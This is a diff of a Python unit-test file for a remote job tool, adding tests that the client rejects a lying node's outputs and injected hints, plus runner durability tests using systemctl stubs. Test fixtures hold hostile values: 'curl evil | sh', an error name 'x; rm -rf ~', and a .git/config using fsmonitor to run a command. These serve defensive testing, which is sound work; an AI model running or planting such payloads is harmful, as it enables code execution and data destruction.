@@ -2,8 +2,8 @@
 with each Python under test). Usage: python unit.py SECTION [ARG...]. Prints one line per check, "ok    name" or
 "FAIL  name" (with details on indented lines), and exits with the number of failed checks.
 
-Sections: durable, atomic, ids, proxy, classify, sshconfig, controlpath, unpack, snapshot-alone, snapshot-content,
-snapshot-report, pins REPO."""
+Sections: durable, atomic, ids, globs, proxy, classify, sshconfig, controlpath, unpack, untrusted-node, runner,
+snapshot-alone, snapshot-content, snapshot-report, pins REPO."""
 import hashlib
 import io
 import json
@@ -159,6 +159,36 @@ def t_ids():
         check("safe_relpath(%r) = %r" % (p, want), proto.safe_relpath(p) == want, proto.safe_relpath(p))
 
 
+def t_globs():
+    """The workstation's glob check is never wider than the node's glob.glob (review finding 1b)."""
+    lax = durable.fault("dot-globs")
+    tag = " (fault dot-globs is on: some of these must FAIL)" if lax else ""
+    for pat, path, ok in (("**/*.json", ".claude/settings.json", False), ("**/*.json", ".mu/jobs/x.json", False),
+                          ("*/config", ".git/config", False), ("*/config", ".GIT/config", False),
+                          ("results/**", "results/.git/config", False), ("results/*", "results/.hidden", False),
+                          ("**", ".envrc", False), ("**", "mu.toml", True), ("results/.keep", "results/.keep", True),
+                          (".cache/*.json", ".cache/a.json", True), ("**/*.json", "a/b/c.json", True)):
+        check("glob %r %s %r%s" % (pat, "matches" if ok else "does not match", path, tag), proto.glob_match(pat, path) == ok)
+    for path, bad in ((".git/config", ".git"), ("a/.GIT/config", ".GIT"), (".Mu/jobs/x.json", ".Mu"), ("a/.git./x", ".git."),
+                      ("results/a.json", None), (".github/x.yml", None), ("a/.mux", None)):
+        check("forbidden part of %r is %r" % (path, bad), proto.forbidden_part(path) == bad, proto.forbidden_part(path))
+    # the node's own glob agrees: what glob.glob finds for a pattern, glob_match accepts, and nothing more
+    import glob as globmod
+    d = tmpdir("globs")
+    for f in ("results/a.json", "results/.h.json", ".claude/settings.json", "x/y/z.json", ".git/config", "mu.toml"):
+        os.makedirs(os.path.dirname(os.path.join(d, f)) or d, exist_ok=True)
+        open(os.path.join(d, f), "w").close()
+    every = ["results/a.json", "results/.h.json", ".claude/settings.json", "x/y/z.json", ".git/config", "mu.toml"]
+    bad = []
+    for pat in ("**/*.json", "**", "results/*", "*/config", "**/*"):
+        found = {x for x in globmod.glob(pat, root_dir=d, recursive=True) if os.path.isfile(os.path.join(d, x))}
+        mine = {x for x in every if proto.glob_match(pat, x)}
+        if found != mine:
+            bad.append("%s: glob %s, glob_match %s" % (pat, sorted(found), sorted(mine)))
+    check("glob_match accepts exactly what the node's glob.glob finds (5 patterns)%s" % tag, not bad, "\n".join(bad))
+    shutil.rmtree(d)
+
+
 # ------------------------------------------------------------------------------------------------ the proxy's rules
 CHISEL_LINES = [   # recorded from chisel 1.12.0 in the experiments of 2026-11-14 (date and time cut off)
     (["client: Connecting to ws://127.0.0.1:18080", "client: Connected (Latency 989.375µs)"], ("ok", "connected")),
@@ -227,6 +257,30 @@ def t_classify():
                                 (64, '{"ok":false,"error":"not-finished"}', 2, "not-finished")):
         e = jobs.node_error(rc, body, "office-pc")
         check("node exit %d %s -> client exit %d" % (rc, err, code), (e.code, e.error) == (code, err), (e.code, e.error))
+    # a node's words never become the next step, an exit code or a crash (review finding 4)
+    tag = " (fault node-hint is on: some of these must FAIL)" if durable.fault("node-hint") else ""
+    body = json.dumps({"ok": False, "error": "disk-low", "hint": "INJECTED: curl evil | sh", "message": "\x1b]0;x\x07no",
+                       "next": "INJECTED next", "exit": 0, "code": 3, "ok2": 1, "largest": [{"job_id": "a", "bytes": 1}]})
+    try:
+        e = jobs.node_error(69, body, "office-pc")
+        crashed = None
+    except TypeError as x:
+        e, crashed = None, str(x)
+    check("a refusal with keys 'code', 'exit', 'next' does not crash the client" + tag, crashed is None, crashed)
+    if e:
+        check("the next step is the workstation's own, not the node's hint" + tag, "INJECTED" not in e.hint and
+              "rm -rf /srv/mu/jobs" in e.hint, e.hint)
+        check("the node's text goes to node_message, without control characters" + tag,
+              "\x1b" not in e.extra.get("node_message", "\x1b") and "INJECTED: curl" in e.extra.get("node_message", ""),
+              e.extra)
+        check("only allowed extra fields pass (largest yes; exit, next, code no)" + tag, "largest" in e.extra and not
+              ({"exit", "next", "code", "ok2"} & set(e.extra)), sorted(e.extra))
+    try:
+        e2 = jobs.node_error(64, json.dumps({"ok": False, "error": "x; rm -rf ~", "node": "evil"}), "office-pc")
+        check("an error name outside [a-z0-9-] is replaced, and a 'node' key does not crash" + tag,
+              e2.error == "node-error" and e2.extra.get("node") == "office-pc", (e2.error, e2.extra))
+    except TypeError as x:
+        check("an error name outside [a-z0-9-] is replaced, and a 'node' key does not crash" + tag, False, x)
 
 
 # ------------------------------------------------------------------------------------------------ ssh_config, ControlPath
@@ -400,6 +454,343 @@ def t_unpack():
     w, err, files, _ = run([rj, ("results/a.json", a), ("img/b.png", b + b"!")])
     check("a mismatch keeps the files before it and writes nothing from that file on", files == ["results/a.json"] and
           err is not None, (files, err))
+    # outputs never go into .git or .mu, whatever the globs (review finding 1b)
+    cfg = b"[core]\n\tfsmonitor = touch PWNED\n"
+    tag = " (fault dot-globs is on: this must FAIL)" if durable.fault("dot-globs") else ""
+    w, err, files, _ = run([rj, (".git/config", cfg)], {"outputs": [out(".git/config", cfg)]}, ["**", ".git/*"])
+    check("refused: .git/config even when a glob names it" + tag, err is not None and ".git/config" not in files, (w, files))
+    w, err, files, _ = run([rj, (".claude/settings.json", cfg)], {"outputs": [out(".claude/settings.json", cfg)]},
+                           ["**/*.json"])
+    check("refused: .claude/settings.json under **/*.json (a wildcard never matches a hidden name)" + tag,
+          err is not None and not files, (w, files))
+    # a member longer than the result records stops at once, before it is written (review finding 5)
+    big = b"z" * (3 << 20)
+    tag = " (fault no-size-guard is on: this must FAIL)" if durable.fault("no-size-guard") else ""
+    w, err, files, _ = run([rj, ("results/a.json", big)], {"outputs": [dict(out("results/a.json", big), size=10)]})
+    check("refused before reading: a member of 3 MB that the result records as 10 bytes" + tag,
+          err is not None and "10" in err and "bytes; the result records" in err, err)
+
+
+# ------------------------------------------------------------------------------------------------ an untrusted node
+def t_untrusted_node():
+    """The real `mu fetch` and a refusal, through cli.py, against fake-node-ssh.py (a node that lies)."""
+    d = tmpdir("untrusted")
+    env = dict(os.environ, MU_HOME=os.path.join(d, "mu"), MU_SRC=os.path.join(REPO, "src"),
+               MU_SSH=os.path.join(HERE, "fake-node-ssh.py"), MU_CHISEL="/usr/bin/true", HOME=d)
+    for k in ("FAKE_PLAN", "FAKE_GLOBS", "FAKE_REFUSE", "MU_PROJECT", "MU_VERSION"):
+        env.pop(k, None)
+    cli = [sys.executable, "-I", "-S", os.path.join(REPO, "src", "mu", "cli.py")]
+    blob = b"\x00\x00\x00\x0bssh-ed25519\x00\x00\x00\x20" + b"\x01" * 32
+    import base64
+    hk = "ssh-ed25519 " + base64.b64encode(blob).decode()
+    r = subprocess.run(cli + ["compute", "add", "office-pc", "--host-key", hk, "--relay", "https://relay.example",
+                              "--relay-fingerprint", "A" * 43 + "=", "--relay-user", "avi-mac", "--secret-store", "file",
+                              "--relay-password-stdin", "--json"], input=b"pw-pw-pw-pw-pw-pw-pw-pw-pw\n", env=env,
+                       capture_output=True)
+    check("pairing a fake node (no network)", r.returncode == 0, r.stdout + r.stderr)
+    proj = os.path.join(d, "proj")
+    os.makedirs(proj)
+    git(proj, "init", "-q")
+    with open(os.path.join(proj, "mu.toml"), "w") as f:
+        f.write('[mu]\nversion = "v2026.11.6"\n[compute]\noutputs = ["results/*.json"]\n')
+    git(proj, "add", "mu.toml")
+    git(proj, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init")
+    jid = "20261114-120000-abcdef"
+    os.makedirs(os.path.join(proj, ".mu", "jobs"))
+    durable.write_record(os.path.join(proj, ".mu", "jobs", jid + ".json"), {
+        "schema": 1, "job_id": jid, "node": "office-pc", "state": "queued",
+        "spec": {"job_id": jid, "outputs": ["results/*.json"]}})
+    evil = [{"path": ".git/config", "data": "[core]\n\tfsmonitor = \"touch PWNED; false\"\n"},
+            {"path": ".claude/settings.json", "data": '{"hooks": {}}\n'},
+            {"path": "mu.toml", "data": '[mu]\nversion = "evil"\n'},
+            {"path": "results/a.json", "data": '{"ok": 1}\n'}]
+    before = {f: open(os.path.join(proj, f), "rb").read() for f in (".git/config", "mu.toml")}
+    tag = " (fault trust-node-globs is on: this must FAIL)" if durable.fault("trust-node-globs") else ""
+    for plan, globs, name in (([evil[2], evil[3]], ["**"], "mu.toml, which the node's globs (**) cover"),
+                              ([evil[0], evil[3]], ["**"], ".git/config"),
+                              ([evil[1], evil[3]], ["**"], ".claude/settings.json")):
+        e = dict(env, FAKE_PLAN=json.dumps(plan), FAKE_GLOBS=json.dumps(globs))
+        r = subprocess.run(cli + ["fetch", jid, "--json"], cwd=proj, env=e, capture_output=True)
+        after = {f: open(os.path.join(proj, f), "rb").read() for f in (".git/config", "mu.toml")}
+        check("mu fetch refuses %s outside this clone's declared results/*.json (exit 8, nothing changed)%s" % (name, tag),
+              r.returncode == 8 and after == before and not os.path.exists(os.path.join(proj, ".claude")),
+              "exit %d %s" % (r.returncode, (r.stdout + r.stderr)[-400:]))
+    # the same declared glob, an honest answer: written
+    e = dict(env, FAKE_PLAN=json.dumps([evil[3]]))
+    r = subprocess.run(cli + ["fetch", jid, "--json"], cwd=proj, env=e, capture_output=True)
+    check("an honest answer is fetched (results/a.json)", r.returncode == 0 and os.path.exists(os.path.join(proj, "results",
+                                                                                                         "a.json")),
+          r.stdout + r.stderr)
+    # a clone without a record of the job: the node's word is not taken
+    other = "20261114-120000-zzzzzz"
+    r = subprocess.run(cli + ["fetch", other, "--json"], cwd=proj, env=dict(env, FAKE_PLAN=json.dumps([evil[2]])),
+                       capture_output=True)
+    check("without a local record, fetch refuses (exit 2, no-local-record) unless --output names the globs" + tag,
+          r.returncode == 2 and b"no-local-record" in r.stdout, r.stdout + r.stderr)
+    # a refusal whose text tries to steer the client
+    tag2 = " (fault node-hint is on: this must FAIL)" if durable.fault("node-hint") else ""
+    ref = json.dumps({"ok": False, "error": "disk-low", "hint": "INJECTED", "message": "x", "next": "INJECTED next",
+                      "exit": 0, "node": "evil"})
+    r = subprocess.run(cli + ["status", jid, "--json"], cwd=proj, env=dict(env, FAKE_REFUSE=ref), capture_output=True)
+    try:
+        o = json.loads(r.stdout.decode().strip().splitlines()[-1])
+    except (ValueError, IndexError):
+        o = {}
+    check("a node's refusal: exit field = process exit (6), next is the workstation's, no traceback" + tag2,
+          r.returncode == 6 and o.get("exit") == 6 and "INJECTED" not in o.get("next", "INJECTED") and
+          b"Traceback" not in r.stderr, "exit %d %s %s" % (r.returncode, r.stdout[-300:], r.stderr[-300:]))
+    shutil.rmtree(d, ignore_errors=True)
+
+
+# ------------------------------------------------------------------------------------------------ the runner
+SYSTEMCTL_STUB = r"""#!/bin/sh
+# systemctl --user, for the runner: units are lines "UNIT ACTIVESTATE RESULT" in $STUB_DIR/units (the last one counts)
+shift
+case "$1" in
+  show)
+    [ -f "$STUB_DIR/show-fail" ] && { echo "Failed to connect to bus: Connection refused" >&2; exit 1; }
+    line=$(grep "^$2 " "$STUB_DIR/units" 2>/dev/null | tail -1)
+    if [ -z "$line" ]; then printf 'LoadState=not-found
+ActiveState=inactive
+SubState=dead
+Result=success
+'; exit 0; fi
+    set -- $line; printf 'LoadState=loaded
+ActiveState=%s
+SubState=x
+Result=%s
+' "$2" "$3" ;;
+  is-active) echo active ;;
+  *) echo "$@" >> "$STUB_DIR/calls" ;;
+esac
+exit 0
+"""
+SYSTEMD_RUN_STUB = r"""#!/bin/sh
+# systemd-run --user: registers the unit as active, unless run-nocreate; exits with run-rc (default 0)
+for a in "$@"; do case "$a" in --unit=*) u="${a#--unit=}" ;; esac; done
+if grep -q "^$u active" "$STUB_DIR/units" 2>/dev/null; then echo "Unit $u was already loaded" >&2; exit 1; fi
+[ -f "$STUB_DIR/run-nocreate" ] || echo "$u active success" >> "$STUB_DIR/units"
+echo "start $u" >> "$STUB_DIR/calls"
+rc=$(cat "$STUB_DIR/run-rc" 2>/dev/null || echo 0); [ "$rc" = 0 ] || echo "Failed to start transient service unit: timed out" >&2
+exit $rc
+"""
+
+
+def t_runner():
+    """The runner's passes against stubs of systemctl and systemd-run (review: durability 1-5). Each scenario starts
+    from an empty node; work/ is made by a stand-in for the git checkout."""
+    base = tmpdir("runner")
+    stubs = os.path.join(base, "bin")
+    os.makedirs(stubs)
+    for name, text in (("systemctl", SYSTEMCTL_STUB), ("systemd-run", SYSTEMD_RUN_STUB)):
+        with open(os.path.join(stubs, name), "w") as f:
+            f.write(text)
+        os.chmod(os.path.join(stubs, name), 0o755)
+    os.environ.update(MU_SYSTEMCTL=os.path.join(stubs, "systemctl"), MU_SYSTEMD_RUN=os.path.join(stubs, "systemd-run"),
+                      MU_WSL_HOST_DRIVE="/nonexistent", MU_HOME=os.path.join(base, "home"))
+    from mu import node
+
+    def prep(j):
+        shutil.rmtree(os.path.join(j["dir"], "work"), ignore_errors=True)
+        os.mkdir(os.path.join(j["dir"], "work"))
+    node.prepare_work = prep
+    st = {}
+
+    def fresh(tag, **nodejson):
+        d = os.path.join(base, tag)
+        for x in ("srv/jobs", "stub", "home"):
+            os.makedirs(os.path.join(d, x))
+        node.ROOT = os.path.join(d, "srv")
+        os.environ["STUB_DIR"] = st["stub"] = os.path.join(d, "stub")
+        durable.write_record(os.path.join(node.ROOT, "node.json"), dict({"name": "n", "min_free_gb": 0}, **nodejson))
+
+    def mkjob(jid, ns):
+        d = node.job_dir(jid)
+        os.makedirs(d)
+        durable.write_record(os.path.join(d, "job.json"), {"schema": 1, "job_id": jid, "project_id": "p-0123456789ab",
+                                                           "mu_version": "v1", "argv": ["true"], "cwd": "", "outputs": [],
+                                                           "limits": {}, "rerun": True, "accepted_ns": ns})
+        durable.write_record(os.path.join(d, "state.json"), {"state": "queued", "attempt": 1})
+        return d
+
+    def stub(name, text=""):
+        with open(os.path.join(st["stub"], name), "w") as f:
+            f.write(text)
+
+    def unit_line(jid, active, result):
+        with open(os.path.join(st["stub"], "units"), "a") as f:
+            f.write("mu-job-%s.service %s %s\n" % (jid, active, result))
+
+    def job(jid):
+        return node.load_job(jid)
+
+    def started():
+        try:
+            return [ln.split()[1] for ln in open(os.path.join(st["stub"], "calls")) if ln.startswith("start ")]
+        except OSError:
+            return []
+    A, B = "20261114-100000-aaaaaa", "20261114-100001-bbbbbb"
+    ua, ub = "mu-job-%s.service" % A, "mu-job-%s.service" % B
+
+    def flag(f):
+        return " (fault %s is on: this must FAIL)" % f if durable.fault(f) else ""
+
+    # 1. one failed `systemctl show` (a bus error) does not end a running job
+    fresh("bus")
+    da = mkjob(A, 1)
+    node.step(first=True)
+    with open(os.path.join(da, "work", "partial.dat"), "w") as f:
+        f.write("in progress")
+    stub("show-fail")
+    node.step()
+    os.unlink(os.path.join(st["stub"], "show-fail"))
+    node.step()
+    j = job(A)
+    check("a failed systemctl show leaves the job running, its work/ and attempt 1 (no re-run, no result)" +
+          flag("bus-error-is-end"), j["result"] is None and (j["state"] or {}).get("state") == "running" and
+          j["state"].get("attempt") == 1 and os.path.exists(os.path.join(da, "work", "partial.dat")),
+          (j["state"], j["result"] and j["result"].get("note")))
+
+    # 2. systemd-run fails but the unit exists: not failed, nothing started beside it
+    fresh("runfail")
+    mkjob(A, 1)
+    mkjob(B, 2)
+    stub("run-rc", "1")
+    node.step(first=True)
+    stub("run-rc", "0")
+    node.step()
+    ja, jb = job(A), job(B)
+    check("systemd-run failed after making the unit: the job stays running, the next is not started" + flag("trust-run-rc"),
+          ja["result"] is None and (ja["state"] or {}).get("state") == "running" and started() == [ua], (
+              ja["result"] and ja["result"].get("note"), started()))
+    # ... and a start that really failed (no unit) goes back to the queue, failed after 3
+    fresh("nocreate")
+    mkjob(A, 1)
+    stub("run-rc", "1")
+    stub("run-nocreate")
+    node.step(first=True)
+    j1 = job(A)
+    node.step()
+    node.step()
+    j3 = job(A)
+    check("a start without a unit: queued again with the attempt kept, failed after 3 tries",
+          (j1["state"] or {}).get("state") == "queued" and j1["state"].get("start_failures") == 1 and
+          j1["state"].get("attempt") == 1 and (j3["result"] or {}).get("state") == "failed", (j1["state"], j3["result"]))
+
+    # 3. state.json unreadable while the job runs: rebuilt, not started again
+    fresh("torn")
+    da = mkjob(A, 1)
+    node.step(first=True)
+    with open(os.path.join(da, "work", "partial.dat"), "w") as f:
+        f.write("in progress")
+    with open(os.path.join(da, "state.json"), "wb") as f:
+        f.write(b"\0" * 300)
+    node.step()
+    j = job(A)
+    check("state.json NUL-filled while running: rebuilt as running, not started twice, work/ kept" + flag("no-unit-check-torn"),
+          j["result"] is None and (j["state"] or {}).get("state") == "running" and started() == [ua] and
+          os.path.exists(os.path.join(da, "work", "partial.dat")), (j["state"], started()))
+
+    # 4. a re-run keeps the log: offsets stay valid, the marker says what happened
+    fresh("rerun")
+    da = mkjob(A, 1)
+    node.step(first=True)
+    with open(os.path.join(da, "log"), "wb") as f:
+        f.write(b"A" * 100)
+    stub("units", "")              # the unit is gone (the distro stopped): the job ended without a result
+    node.step()
+    try:
+        with open(os.path.join(da, "log"), "rb") as f:
+            log = f.read()
+    except OSError:
+        log = b""
+    j = job(A)
+    check("a re-run keeps the first attempt's log and appends a marker (a reader at byte 100 misses nothing)" +
+          flag("log-truncate-on-rerun"), log.startswith(b"A" * 100) and b"re-run as attempt 2" in log and
+          (j["state"] or {}).get("attempt") == 2, (log[:120], j["state"]))
+
+    # 5. one job's error does not stop the pass: another job's cancel is still done
+    fresh("ioerr")
+    da = mkjob(A, 1)
+    db = mkjob(B, 2)
+    node.step(first=True)
+    unit_line(A, "failed", "exit-code")
+    durable.write_durable(os.path.join(db, "cancel"), "cancel\n")
+    os.chmod(da, 0o500)
+    raised = None
+    try:
+        node.step()
+    except Exception as e:  # noqa
+        raised = repr(e)
+    os.chmod(da, 0o700)
+    jb = job(B)
+    check("a job whose folder cannot be written does not stop the pass: the other job's cancel is done" +
+          flag("runner-pass-aborts"), raised is None and (jb["result"] or {}).get("state") == "cancelled", (raised, jb["result"]))
+    if os.getuid() == 0:
+        print("info  (as root the folder stays writable: the scenario checks less)")
+
+    # 6. too little disk: the job waits instead of starting
+    fresh("disk", min_free_gb=10 ** 9)
+    mkjob(A, 1)
+    node.step(first=True)
+    j = job(A)
+    check("free disk below min_free_gb: the next job waits (queued, a note), not started" + flag("no-start-disk-check"),
+          started() == [] and (j["state"] or {}).get("state") == "queued" and "waiting" in (j["state"].get("note") or ""),
+          (started(), j["state"]))
+
+    # 7. a log past its cap stops the job, which ends failed with that note
+    fresh("logcap", log_cap_gb=1e-6)
+    da = mkjob(A, 1)
+    node.step(first=True)
+    with open(os.path.join(da, "log"), "wb") as f:
+        f.write(b"x" * 5000)
+    node.step()
+    try:
+        stopped = any(ln.startswith("--user stop %s" % ua) or ln.startswith("stop %s" % ua)
+                      for ln in open(os.path.join(st["stub"], "calls")))
+    except OSError:
+        stopped = False
+    unit_line(A, "inactive", "success")
+    node.step()
+    j = job(A)
+    check("a log over its cap: the unit is stopped and the job ends failed, saying so" + flag("no-log-cap"),
+          stopped and (j["result"] or {}).get("state") == "failed" and "log grew past" in (j["result"].get("note") or ""),
+          (stopped, j["result"] and j["result"].get("note")))
+
+    # 8. a final-named folder with an unreadable job.json is moved aside, never deleted
+    fresh("damaged")
+    d = node.job_dir(A)
+    os.makedirs(d)
+    with open(os.path.join(d, "job.json"), "wb") as f:
+        f.write(b"\0" * 100)
+    durable.write_record(os.path.join(d, "result.json"), {"job_id": A, "state": "succeeded"})
+    node.recover()
+    kept = [x for x in os.listdir(os.path.join(node.ROOT, "damaged"))] if os.path.isdir(os.path.join(node.ROOT, "damaged")) else []
+    check("recovery moves a damaged job folder to damaged/ with its result, never deletes it" + flag("delete-damaged"),
+          len(kept) == 1 and os.path.exists(os.path.join(node.ROOT, "damaged", kept[0], "result.json")), kept)
+
+    # 9. results are written once
+    fresh("once")
+    mkjob(A, 1)
+    j = job(A)
+    node.write_result(j, "succeeded", "shim")
+    j = job(A)
+    node.write_result(j, "failed", "runner", note="late")
+    check("a valid result.json is never replaced" + flag("overwrite-result"), job(A)["result"]["state"] == "succeeded",
+          job(A)["result"]["state"])
+
+    # 10. the queue's order survives a clock that steps back
+    fresh("clock")
+    real = time.time_ns
+    try:
+        time.time_ns = lambda: 2000
+        a1 = node.next_accept_ns()
+        time.time_ns = lambda: 1000
+        a2 = node.next_accept_ns()
+    finally:
+        time.time_ns = real
+    check("accepted_ns increases when the clock steps back (FIFO kept)", a2 > a1, (a1, a2))
+    shutil.rmtree(base, ignore_errors=True)
 
 
 # ------------------------------------------------------------------------------------------------ the snapshot
@@ -565,8 +956,9 @@ def t_pins(repo):
           dvv == [version] and dgz == [lin] and len(durl) == 1 and durl[0] in urls, (dvv, dgz, durl))
 
 
-SECTIONS = {"durable": t_durable_main, "atomic": t_atomic, "ids": t_ids, "proxy": t_proxy, "classify": t_classify,
-            "sshconfig": t_sshconfig, "controlpath": t_controlpath, "unpack": t_unpack,
+SECTIONS = {"durable": t_durable_main, "atomic": t_atomic, "ids": t_ids, "globs": t_globs, "proxy": t_proxy,
+            "classify": t_classify, "sshconfig": t_sshconfig, "controlpath": t_controlpath, "unpack": t_unpack,
+            "untrusted-node": t_untrusted_node, "runner": t_runner,
             "snapshot-alone": t_snapshot_alone, "snapshot-content": t_snapshot_content,
             "snapshot-report": t_snapshot_report}
 
